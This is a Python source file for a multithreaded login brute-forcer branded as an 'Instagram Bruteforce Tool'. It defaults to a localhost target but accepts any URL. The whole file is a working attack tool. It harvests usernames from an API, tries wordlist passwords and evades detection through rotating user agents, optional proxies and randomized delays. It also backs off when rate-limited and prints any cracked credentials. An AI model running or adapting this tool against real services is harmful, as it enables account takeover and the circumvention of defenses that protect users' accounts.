import requests
import time
import random
from colorama import Fore, Style, init
from fake_useragent import UserAgent
import json
import sys
import threading
from concurrent.futures import ThreadPoolExecutor
import os
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Initialize colorama for colored output
init()

class InstagramBruteForcer:
    def __init__(self, target_url="http://localhost:5000"):
        self.target_url = target_url
        self.session = requests.Session()
        self.ua = UserAgent()
        self.found_credentials = []
        self.attempted_passwords = set()
        self.total_attempts = 0
        self.success_count = 0
        self.failed_count = 0
        self.blocked_count = 0
        
        # Load configuration
        self.delay_min = 1
        self.delay_max = 3
        self.max_threads = 5
        
        # Proxy rotation (add your proxies here)
        self.proxies_list = [
            # {"http": "http://proxy1:port", "https": "https://proxy1:port"},
            # {"http": "http://proxy2:port", "https": "https://proxy2:port"},
        ]
        
        print(f"{Fore.CYAN}🎯 Instagram Bruteforce Tool Initialized{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}📍 Target: {self.target_url}{Style.RESET_ALL}")
    
    def get_random_headers(self):
        """Generate random headers to mimic real browsers"""
        return {
            'User-Agent': self.ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'Referer': self.target_url,
        }
    
    def get_proxy(self):
        """Get a random proxy from the list"""
        if self.proxies_list:
            return random.choice(self.proxies_list)
        return None
    
    def load_wordlist(self, wordlist_file="wordlist.txt"):
        """Load password wordlist from file"""
        try:
            with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
            print(f"{Fore.GREEN}✅ Loaded {len(passwords)} passwords from {wordlist_file}{Style.RESET_ALL}")
            return passwords
        except FileNotFoundError:
            print(f"{Fore.RED}❌ Wordlist file '{wordlist_file}' not found!{Style.RESET_ALL}")
            return []
        except Exception as e:
            print(f"{Fore.RED}❌ Error loading wordlist: {e}{Style.RESET_ALL}")
            return []
    
    def get_users_from_api(self):
        """Get users from the API endpoint"""
        try:
            response = self.session.get(f"{self.target_url}/api/users", timeout=10)
            if response.status_code == 200:
                data = response.json()
                users = [user['username'] for user in data.get('users', [])]
                print(f"{Fore.GREEN}✅ Retrieved {len(users)} users from API{Style.RESET_ALL}")
                return users
            else:
                print(f"{Fore.YELLOW}⚠️ API endpoint returned status {response.status_code}{Style.RESET_ALL}")
                return []
        except Exception as e:
            print(f"{Fore.YELLOW}⚠️ Could not fetch users from API: {e}{Style.RESET_ALL}")
            return []
    
    def test_credentials(self, username, password):
        """Test a single username/password combination"""
        if f"{username}:{password}" in self.attempted_passwords:
            return False
        
        self.attempted_passwords.add(f"{username}:{password}")
        self.total_attempts += 1
        
        try:
            # Random delay to avoid detection
            time.sleep(random.uniform(self.delay_min, self.delay_max))
            
            # Prepare login data
            login_data = {
                'username': username,
                'password': password
            }
            
            # Get random headers and proxy
            headers = self.get_random_headers()
            proxy = self.get_proxy()
            
            # Make the request
            response = self.session.post(
                f"{self.target_url}/login",
                data=login_data,
                headers=headers,
                proxies=proxy,
                timeout=10,
                allow_redirects=False
            )
            
            # Analyze response
            status_code = response.status_code
            response_text = response.text.lower()
            
            # Success indicators
            if status_code == 200 and any(indicator in response_text for indicator in [
                'welcome', 'dashboard', 'successful', 'account information'
            ]):
                self.success_count += 1
                self.found_credentials.append((username, password))
                print(f"{Fore.GREEN}🎉 SUCCESS! Found credentials: {username}:{password}{Style.RESET_ALL}")
                return True
            
            # Rate limiting / blocking indicators
            elif status_code == 429 or any(indicator in response_text for indicator in [
                'too many', 'blocked', 'rate limit', 'try again later'
            ]):
                self.blocked_count += 1
                print(f"{Fore.YELLOW}🚫 Rate limited for {username}:{password} - Status: {status_code}{Style.RESET_ALL}")
                time.sleep(random.uniform(5, 10))  # Longer delay when blocked
                return False
            
            # Account locked indicators
            elif any(indicator in response_text for indicator in [
                'account locked', 'account disabled', 'suspended'
            ]):
                print(f"{Fore.MAGENTA}🔒 Account locked: {username}{Style.RESET_ALL}")
                return False
            
            # Failed login
            else:
                self.failed_count += 1
                print(f"{Fore.RED}❌ Failed: {username}:{password} - Status: {status_code}{Style.RESET_ALL}")
                return False
                
        except requests.exceptions.Timeout:
            print(f"{Fore.YELLOW}⏱️ Timeout for {username}:{password}{Style.RESET_ALL}")
            return False
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}🔥 Request error for {username}:{password}: {e}{Style.RESET_ALL}")
            return False
        except Exception as e:
            print(f"{Fore.RED}💥 Unexpected error for {username}:{password}: {e}{Style.RESET_ALL}")
            return False
    
    def worker_thread(self, username, passwords):
        """Worker thread for testing passwords for a specific username"""
        print(f"{Fore.CYAN}🔄 Starting attack on user: {username}{Style.RESET_ALL}")
        
        for password in passwords:
            if self.test_credentials(username, password):
                print(f"{Fore.GREEN}✅ Found password for {username}: {password}{Style.RESET_ALL}")
                break
            
            # Progress update every 10 attempts
            if self.total_attempts % 10 == 0:
                self.print_progress()
    
    def print_progress(self):
        """Print current progress statistics"""
        print(f"{Fore.BLUE}📊 Progress: {self.total_attempts} attempts | "
              f"✅ {self.success_count} success | "
              f"❌ {self.failed_count} failed | "
              f"🚫 {self.blocked_count} blocked{Style.RESET_ALL}")
    
    def run_attack(self, usernames, passwords, max_threads=None):
        """Run the brute force attack"""
        if not usernames:
            print(f"{Fore.RED}❌ No usernames provided!{Style.RESET_ALL}")
            return
        
        if not passwords:
            print(f"{Fore.RED}❌ No passwords loaded!{Style.RESET_ALL}")
            return
        
        max_threads = max_threads or self.max_threads
        
        print(f"{Fore.CYAN}🚀 Starting brute force attack...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}👥 Targets: {len(usernames)} users{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}🔑 Passwords: {len(passwords)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}🧵 Threads: {max_threads}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}⏱️ Delay: {self.delay_min}-{self.delay_max} seconds{Style.RESET_ALL}")
        print("-" * 60)
        
        start_time = time.time()
        
        try:
            with ThreadPoolExecutor(max_workers=max_threads) as executor:
                futures = []
                for username in usernames:
                    future = executor.submit(self.worker_thread, username, passwords)
                    futures.append(future)
                
                # Wait for all threads to complete
                for future in futures:
                    future.result()
        
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}⚠️ Attack interrupted by user{Style.RESET_ALL}")
        
        end_time = time.time()
        duration = end_time - start_time
        
        # Print final results
        print("\n" + "=" * 60)
        print(f"{Fore.CYAN}📋 ATTACK COMPLETED{Style.RESET_ALL}")
        print(f"{Fore.BLUE}⏱️ Duration: {duration:.2f} seconds{Style.RESET_ALL}")
        print(f"{Fore.BLUE}📊 Total attempts: {self.total_attempts}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}✅ Successful logins: {self.success_count}{Style.RESET_ALL}")
        print(f"{Fore.RED}❌ Failed attempts: {self.failed_count}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}🚫 Blocked attempts: {self.blocked_count}{Style.RESET_ALL}")
        
        if self.found_credentials:
            print(f"\n{Fore.GREEN}🎉 FOUND CREDENTIALS:{Style.RESET_ALL}")
            for username, password in self.found_credentials:
                print(f"   {Fore.GREEN}📧 {username}:{password}{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.RED}💀 No valid credentials found{Style.RESET_ALL}")
        
        print("=" * 60)

def main():
    """Main function"""
    print(f"{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}🎯 INSTAGRAM BRUTEFORCE TOOL v2.0 (MongoDB Edition){Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
    
    # Initialize bruteforcer
    target_url = input(f"{Fore.CYAN}🌐 Enter target URL (default: http://localhost:5000): {Style.RESET_ALL}").strip()
    if not target_url:
        target_url = "http://localhost:5000"
    
    brute = InstagramBruteForcer(target_url)
    
    # Load passwords
    passwords = brute.load_wordlist()
    if not passwords:
        print(f"{Fore.RED}❌ Cannot proceed without passwords{Style.RESET_ALL}")
        return
    
    # Get usernames
    print(f"\n{Fore.CYAN}👥 Select username source:{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}1. Load from API (recommended){Style.RESET_ALL}")
    print(f"{Fore.YELLOW}2. Manual entry{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}3. Both{Style.RESET_ALL}")
    
    choice = input(f"{Fore.CYAN}Choose option (1-3): {Style.RESET_ALL}").strip()
    
    usernames = []
    
    if choice in ['1', '3']:
        api_users = brute.get_users_from_api()
        usernames.extend(api_users)
    
    if choice in ['2', '3']:
        manual_users = input(f"{Fore.CYAN}📝 Enter usernames (comma-separated): {Style.RESET_ALL}").strip()
        if manual_users:
            usernames.extend([u.strip() for u in manual_users.split(',') if u.strip()])
    
    if not usernames:
        usernames = ['admin', 'testuser', 'user', 'test', 'instagram']
        print(f"{Fore.YELLOW}⚠️ Using default usernames: {usernames}{Style.RESET_ALL}")
    
    # Attack configuration
    threads = input(f"{Fore.CYAN}🧵 Number of threads (default: 5): {Style.RESET_ALL}").strip()
    try:
        threads = int(threads) if threads else 5
    except ValueError:
        threads = 5
    
    # Start attack
    brute.run_attack(usernames, passwords, threads)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}👋 Goodbye!{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}💥 Fatal error: {e}{Style.RESET_ALL}")
